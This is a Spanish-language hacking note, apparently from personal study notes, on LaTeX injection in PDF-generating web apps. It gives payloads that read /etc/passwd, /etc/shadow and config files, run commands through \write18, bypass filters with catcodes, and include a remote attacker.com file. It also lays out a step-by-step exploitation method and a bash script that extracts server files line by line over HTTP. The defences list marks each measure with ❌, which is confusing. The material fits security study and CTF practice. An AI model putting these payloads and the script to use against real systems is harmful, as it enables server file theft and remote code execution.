
## 📚 **Índice 

- [[#🎯 **1. ¿Qué es una Inyección LaTeX?**]]
- [[#🧱 **2. Cómo funciona realmente LaTeX por debajo**]]
    - [[#✔️ 2.1 **Lectura arbitraria de archivos**]]
    - [[#✔️ 2.2 **Lectura línea a línea (bypass sanitización básica)**]]
    - [[#✔️ 2.3 **Ejecución de comandos del sistema**]]
    - [[#✔️ 2.4 **Inclusión de archivos PDF, imágenes, etc.**]]
- [[#📡 **3. Ejemplo realista de ataque**]]
- [[#🧨 **4. Payloads útiles (PayloadAllTheThings resumido )**]]
    - [[#🧨 **4.3 RCE (si shell escape permitido)**]]
    - [[#📤 **4.4 Exfiltración encubierta**]]
    - [[#🔥 **4.5 Inyección encadenada con SSRF**]]
- [[#🧬 **5. Herramientas reales usadas en LaTeX**]]
- [[#🛠️ **6. Cómo explotar de manera PROFESIONAL**]]
    - [[#🧭 6.1 **Fase 1 — Descubrir sanitización**]]
    - [[#🔍 6.2 **Fase 2 — Enumerar archivos del sistema**]]
    - [[#💣 6.3 **Fase 3 — Escalar a RCE (si posible)**]]
- [[#🛡️ **7. Defensas**]]
- [[#🧪 **8. Script de extracción de archivos **]]
- [[#🌍 **9. Aplicaciones reales del ataque**]]
- [[#✔️ **10. Resumen ejecutivo (para pegar en auditorías)**]]

## 🎯 **1. ¿Qué es una Inyección LaTeX?**

Las **inyecciones LaTeX** ocurren cuando una aplicación web genera documentos (normalmente PDF) utilizando **LaTeX en el backend**, permitiendo que el usuario provea texto que luego es insertado en un `.tex`.

Si la entrada **no se sanitiza correctamente**, un atacante puede inyectar:

- comandos LaTeX peligrosos
    
- lectura de archivos locales
    
- ejecución de comandos del sistema (si está activado `--shell-escape`)
    
- SSRF-like leyendo archivos remotos
    
- RFI-like incluyendo archivos locales vía `\input`, `\include`
    
- File disclosure escalonado línea a línea usando canales internos de TeX
    

Esto convierte LaTeX en un **lenguaje de scripting con capacidades de RFI + LFI + RCE**.

---

# 🧱 **2. Cómo funciona realmente LaTeX por debajo**

LaTeX NO es seguro. Su arquitectura permite cosas como:

### ✔️ 2.1 **Lectura arbitraria de archivos**

Mediante:

```
\input{/etc/passwd}
```

o:

```
\include{/var/www/app/config.php}
```

### ✔️ 2.2 **Lectura línea a línea (bypass sanitización básica)**

Cuando el input directo está filtrado, puedes abusar de los _file streams_ internos:

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\line
```

Esto imprime solo **la primera línea** → puedes forzar un loop para leer muchas.

---

### ✔️ 2.3 **Ejecución de comandos del sistema**

Solo si la app compila con:

```
pdflatex --shell-escape
```

Entonces puedes hacer:

```
\immediate\write18{ls -la / > /tmp/out.txt}
```

Esto ya es **RCE puro**.

---

### ✔️ 2.4 **Inclusión de archivos PDF, imágenes, etc.**

```
\includegraphics{/home/user/secreto.png}
```

Permite extraer archivos binarios (si la aplicación entrega el PDF final sin filtrado).

---

# 📡 **3. Ejemplo realista de ataque**

Una web te deja escribir texto que luego genera un PDF.  
Lo típico: _"Genera el reporte en PDF con tu nombre y descripción..."_

Su código hace esto:

```tex
\documentclass{article}
\begin{document}
Nombre: USERINPUT
\end{document}
```

Tú envías:

```tex
\input{/etc/passwd}
```

Y el PDF devuelto contiene el archivo entero.

Si el desarrollador añadió un “filtro” inútil que elimina `\input`, puedes hacer:

```
\include{/etc/passwd}
```

o:

```
\catcode`\{=1 \catcode`\}=2
\input /etc/passwd
```

o técnicas más rebuscadas usando catcodes.

---

# 🧨 **4. Payloads útiles (PayloadAllTheThings resumido )**

### 📂 **4.1 LFI — Leer archivos**

```
\input{/etc/passwd}
```

```
\include{/var/www/html/config.php}
```

### 🧵 **4.2 Lectura línea a línea**

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\line
```

### 🧨 **4.3 RCE (si shell escape permitido)**

```
\immediate\write18{cat /etc/passwd > /tmp/x}
```

### 📤 **4.4 Exfiltración encubierta**

Insertando contenido dentro del PDF devuelto:

```
\texttt{\input{/etc/shadow}}
```

### 🔥 **4.5 Inyección encadenada con SSRF**

```
\input{http://attacker.com/payload.tex}
```

---

# 🧬 **5. Herramientas reales usadas en LaTeX**

### ✔️ **latexmk / pdflatex** → compilan documentos

### ✔️ **zathura** → visor

### ✔️ **rubber** → automatizador

Si la aplicación usa `latexmk -shell-escape`, casi seguro se puede lograr RCE.

---

# 🛠️ **6. Cómo explotar de manera PROFESIONAL**

### 🧭 6.1 **Fase 1 — Descubrir sanitización**

Prueba los payloads más simples:

- `\input{}`
    
- `\include{}`
    
- `\write18{}`
    

Si no funcionan → entonces usan sanitización básica → prueba:

- catcodes
    
- streams
    
- lectura línea a línea
    
- comentarios
    
- encoding (UTF-8 + escapes)
    

---

### 🔍 6.2 **Fase 2 — Enumerar archivos del sistema**

Busca rutas reales:

- `/etc/passwd`
    
- `/etc/hostname`
    
- `/var/www/…`
    
- `config.php`
    

Si ves contenido → estás explotando LFI.

---

### 💣 6.3 **Fase 3 — Escalar a RCE (si posible)**

Test:

```
\immediate\write18{id > /tmp/pwned}
```

Luego en el sistema víctima revisas si existe → confirmación de ejecución.

---

# 🛡️ **7. Defensas 

### ❌ Desactivar `--shell-escape`

### ❌ Filtrar TODOS los comandos sensitivos

### ❌ Usar sandboxing (Docker, AppArmor)

### ❌ Escapar caracteres `{}`, `\`, `~`, `%`

### ❌ Convertir el input a texto plano antes del render

**Conclusión:**  
Renderizar LaTeX con input del usuario es peligrosísimo si no se aplica una política estricta.

---

# 🧪 **8. Script de extracción de archivos **

automatizacion en bash scripting de extraccion linea a linea sin include, sin input y sin  los loops nativos de LaTex que muchas veces dan error.   

```bash
#!/bin/bash

# Script para exfiltrar archivos desde un backend vulnerable a LaTeX Injection
# Utiliza lectura línea a línea mediante \newread/\openin/\read

main_url="http://localhost/ajax.php"
filename=$1

if [ $1 ]; then
    read_file_to_line="%0A\\read\\file2to\\line"

    for i in $(seq 1 100); do

        # Petición al backend vulnerable
        file_to_download=$(curl -s -X POST $main_url \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -d "content=\newread\file2\openin\file2=${filename}${read_file_to_line}%0A\text\line%0A\closein\file2\texttemplate=blank" \
            | grep -i download | awk '{print $NF}')

        if [ ! $file_to_download ]; then
            wget $file_to_download &>/dev/null

            # Convertir PDF a TXT para analizar cada línea
            file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk '{NF; print $NF}')
            pdftotext $file_to_convert

            file_to_read=$(echo $file_to_convert | sed 's/.pdf/.txt/')
            rm $file_to_convert

            # Mostrar la primera línea y avanzar
            cat $file_to_read | head -1
            rm $file_to_read

            # Actualizar parámetro para avanzar una línea
            read_file_to_line="%0A\\read\\file2to\\line"
        else
            read_file_to_line="%0A\\read\\file2to\\line"
        fi
    done
else
    echo -e "\n[!] Uso: $0 /etc/passwd\n"
fi
```

---

# 🌍 **9. Aplicaciones reales del ataque**

### 🧩 9.1 Plataformas educativas / científicas

Sistemas donde los estudiantes suben expresiones matemáticas → PDF final → vulnerable.

### 🧩 9.2 Sistemas de facturación

Muchos “exportar factura a PDF” se implementan con LaTeX → si concatenan cadenas → _Game Over_.

### 🧩 9.3 Generadores de certificados o diplomas

Muy comunes — insertan nombres y descripciones sin escapar.

### 🧩 9.4 Intranets con reportes automáticos

Empresas que procesan informes internos desde formularios → potencial RCE silencioso.

### 🧩 9.5 CTFs y plataformas de entrenamiento

Como el laboratorio de InternetWache que mencionaste → clásico para practicar.

### 🧩 9.6 Aplicaciones DevOps internas

Scripts que generan documentación automatizada con LaTeX → si reciben JSON no validado → muerte.

---

# ✔️ **10. Resumen ejecutivo (para pegar en auditorías)**

- LaTeX es tan poderoso que permite **leer archivos**, **escribir archivos**, **ejecutar comandos**, **leer línea a línea** y manipular streams internos.
    
- Un campo de texto mal validado equivale literalmente a **dar acceso al sistema de archivos del servidor**.
    
- Con `--shell-escape`, LaTeX se convierte en **una shell remota**.
    
- Nunca se debe usar LaTeX sin un proceso fuerte de sanitización y aislamiento.
    

---

